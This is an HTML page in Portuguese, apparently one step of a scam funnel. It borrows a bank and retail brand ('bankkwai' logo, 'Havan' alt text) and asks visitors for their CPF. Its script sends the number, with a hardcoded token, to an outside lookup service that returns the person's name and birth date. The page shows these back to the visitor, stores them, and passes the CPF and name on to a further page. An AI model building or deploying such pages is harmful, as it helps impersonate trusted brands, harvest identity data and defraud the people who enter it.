<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="style.css">    
    <script src="https://kit.fontawesome.com/021532d534.js" crossorigin="anonymous"></script>    <style>
</style>
<style>
    body {
        margin: 0;
        font-family: Arial, sans-serif;
        background-color: #f2f2f2;
        color: #333;
    }
    .header {
        display: flex;
        align-items: center;
        padding: 0px 10px;
        border-bottom: 1px solid #d55a1c;
        background-color: #f2f2f2;
    }
    .header img {
        width: 138px;
        padding: 10px;
    }
    .logo {
        margin-left: 20px;
    }
    .content {
        margin: 0px 15px;
        padding: 10px 20px 30px 20px;
        border-radius: 10px;
        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        background-color: #ffffff;
        margin-top: 20px;
    }
    h1 {
        font-family: 'Sora', sans-serif;
        color: #333;
        font-size: 16px;
        margin-bottom: 20px;
    }
    .cpf-input {
        width: 100%;
        padding: 15px;
        font-size: 16px;
        border: 1px solid #ccc;
        border-radius: 5px;
        margin-bottom: 20px;
        box-sizing: border-box;
    }
    .button, .button2 {
        background-color: #FE4908;
        color: #ffffff;
        padding: 15px 30px;
        border-radius: 10px;
        font-family: 'Sora', sans-serif;
        font-weight: bold;
        font-size: 16px;
        cursor: pointer;
        width: 100%;
        text-decoration: none;
        display: inline-block;
        text-align: center;
        box-sizing: border-box;
        border: none;
    }
    .button:hover {
        background-color: #123f82;
    }
    label {
        font-family: 'Sora', sans-serif;
        color: #666;
        font-size: 16px;
        display: block;
        margin-bottom: 10px;
    }
    .notification-card {
        background-color: #ffeded;
        border: 1px solid #ff5252;
        color: #ff5252;
        padding: 15px 20px;
        border-radius: 8px;
        font-family: 'Sora', sans-serif;
        display: flex;
        align-items: center;
        margin-bottom: 20px;
        display: none;
    }
    .notification-card i {
        margin-right: 10px;
        font-size: 18px;
    }
    .loading-spinner {
        border: 2px solid rgba(255, 255, 255, 0.3);
        border-radius: 50%;
        border-top: 2px solid #fff;
        width: 16px;
        height: 16px;
        animation: spin 0.8s linear infinite;
        display: inline-block;
        vertical-align: middle;
        margin-right: 8px;
    }
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
</style>
</head>
<body cz-shortcut-listen="true">
    <!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-W2NK2Z4N"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->

<div class="header">
    <img src="./images/bankkwai.png
" alt="Logo Havan" class="logo">
</div>

<div class="content">
    <div id="primeiraParte">
        <h1>Preencha seus dados para cadastro</h1>

        <label for="cpf">CPF</label>
        <input type="text" id="cpf" class="cpf-input" placeholder="000.000.000-00" maxlength="14">

        <div id="notification" class="notification-card">
            <i class="fas fa-exclamation-circle"></i>
            <span id="notification-message"></span>
        </div>

        <button class="button2" id="consultarBtn">Continuar</button>
    </div>

    <div id="resultadoModal" style="display: none;">
        <div style="text-align: center; margin: 20px 0;">
            <svg width="40" height="40" viewBox="0 0 40 40">
                <circle cx="20" cy="20" r="19" fill="#4CAF50" stroke="#45a049" stroke-width="2"></circle>
                <path d="M12 20l6 6 12-12" stroke="white" stroke-width="3" fill="none"></path>
            </svg>
            <h3 style="color: #4CAF50; margin: 10px 0;">Dados encontrados com sucesso!</h3>
        </div>

        <div id="dadosContainer" style="font-family: 'Sora', sans-serif;">
            <p><strong>Nome:</strong> <span id="nomeResult"></span></p>
            <p id="maeContainer" style="display: none;"><strong>Nome da Mãe:</strong> <span id="maeResult"></span></p>
            <p style="margin-top: 15px;"><strong>Data de Nascimento:</strong> <span id="nascimentoResult"></span></p>
        </div>

        <button class="button" id="modalContinuarBtn">Continuar</button>
    </div>
</div>

<script>
const initialUrlParams = new URLSearchParams(window.location.search);

function showNotification(message) {
    const notification = document.getElementById('notification');
    const notificationMessage = document.getElementById('notification-message');
    if (notification && notificationMessage) {
        notificationMessage.textContent = message;
        notification.style.display = 'flex';
        setTimeout(() => notification.style.display = 'none', 3000);
    } else {
        console.error(message);
    }
}

const token = '5590b7c3f00746f81a416b3363e064193e52b2d68d48132c8d85536689f01ea0';

document.getElementById('consultarBtn').addEventListener('click', async () => {
    const cpfInput = document.getElementById('cpf');
    const consultarBtn = document.getElementById('consultarBtn');
    const cpf = cpfInput.value.replace(/\D/g, '');

    if (cpf.length !== 11) {
        showNotification('Por favor, insira um CPF válido com 11 dígitos.');
        return;
    }

    consultarBtn.innerHTML = '<span class="loading-spinner"></span> Consultando...';
    consultarBtn.disabled = true;

    try {
        const response = await fetch(`https://bk.elaitech.pro/consultar-filtrada/cpf?cpf=${cpf}&token=9ef0a0680f56a3d2064b7bee7a0b2f4f108344fca96bb107f52e304061d2c3cd`, {
            method: 'GET',
            headers: {
                'Accept': 'application/json'
            }
        });

        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }

        const data = await response.json();
        console.log('Dados do CPF:', data);

        if (data && data.cpf && data.nome) {
            const dadosUsuario = {
                CPF: data.cpf,
                NOME: data.nome,
                NASCIMENTO: data.nascimento
            };

            localStorage.setItem('dadosUsuario', JSON.stringify(dadosUsuario));

            document.getElementById('nomeResult').textContent = dadosUsuario.NOME;
            document.getElementById('nascimentoResult').textContent = dadosUsuario.NASCIMENTO;

            document.getElementById('resultadoModal').style.display = 'block';
            document.getElementById('primeiraParte').style.display = 'none';
        } else {
            showNotification('CPF não encontrado.');
        }
    } catch (error) {
        console.error('Erro na consulta:', error);
        showNotification('Erro ao consultar CPF.');
    } finally {
        consultarBtn.innerHTML = 'Continuar';
        consultarBtn.disabled = false;
    }
});

const modalBtn = document.getElementById('modalContinuarBtn');
modalBtn.addEventListener('click', () => {
    const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario') || '{}');
    const url = new URL('./5.html', window.location.origin);
    for (const [k, v] of initialUrlParams.entries()) {
        url.searchParams.append(k, v);
    }
    if (dadosUsuario.CPF) url.searchParams.set('cpf', dadosUsuario.CPF.replace(/\D/g, ''));
    if (dadosUsuario.NOME) url.searchParams.set('nome', dadosUsuario.NOME);
    window.location.href = url.toString();
});
</script>



</body>
</html>
